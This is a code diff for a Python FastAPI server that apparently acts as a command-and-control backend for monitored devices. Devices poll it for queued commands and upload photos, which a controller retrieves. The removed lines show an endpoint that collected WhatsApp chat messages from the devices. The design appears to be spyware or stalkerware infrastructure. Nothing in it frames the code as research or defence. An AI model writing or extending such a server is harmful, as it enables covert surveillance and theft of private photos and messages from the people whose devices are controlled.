@@ -6,8 +6,7 @@ API_KEY = "MY_SECRET_KEY_123"
 
 device_data = {} 
 command_queue = []
-latest_image_bytes = None # Changed to store raw bytes
-latest_wa_chats = []  
+latest_image_bytes = None
 debug_msg = "No debug info yet"
 
 def check_key(request: Request):
@@ -21,18 +20,16 @@ async def get_commands(request: Request):
     device_id = data.get("device_id")
     data["last_seen"] = time.time()
     device_data[device_id] = data
-    
     cmds = list(command_queue)
     command_queue.clear()
     return {"commands": cmds}
 
-# NEW: Accept raw file uploads
 @app.post("/upload_photo")
 async def upload_photo(request: Request, file: UploadFile = File(...)):
     global latest_image_bytes
     check_key(request)
     latest_image_bytes = await file.read()
-    print(f"PHOTO SAVED! Size: {len(latest_image_bytes)} bytes")
+    print(f"PHOTO RECEIVED! Size: {len(latest_image_bytes)}")
     return {"status": "ok"}
 
 @app.post("/result")
@@ -44,34 +41,13 @@ async def post_result(request: Request):
         debug_msg = data["debug_text"]
     return {"status": "ok"}
 
-@app.post("/wa")
-async def post_wa(request: Request):
-    global latest_wa_chats
-    check_key(request)
-    data = await request.json()
-    if "messages" in data:
-        for msg in data["messages"]:
-            latest_wa_chats.insert(0, msg)
-        latest_wa_chats = latest_wa_chats[:50] 
-    return {"status": "ok"}
-
 @app.get("/state")
 async def get_state(request: Request):
     check_key(request)
     now = time.time()
-    active_devices = {}
-    for dev_id, info in device_data.items():
-        if now - info.get("last_seen", 0) < 15:
-            active_devices[dev_id] = info
+    active_devices = {k: v for k, v in device_data.items() if now - v.get("last_seen", 0) < 15}
+    return {"devices": active_devices, "has_image": latest_image_bytes is not None, "debug_msg": debug_msg}
 
-    return {
-        "devices": active_devices,
-        "has_image": latest_image_bytes is not None, # Tell controller if photo exists
-        "wa_chats": latest_wa_chats,
-        "debug_msg": debug_msg
-    }
-
-# NEW: Serve the image bytes to the controller
 @app.get("/get_photo")
 async def get_photo(request: Request):
     check_key(request)
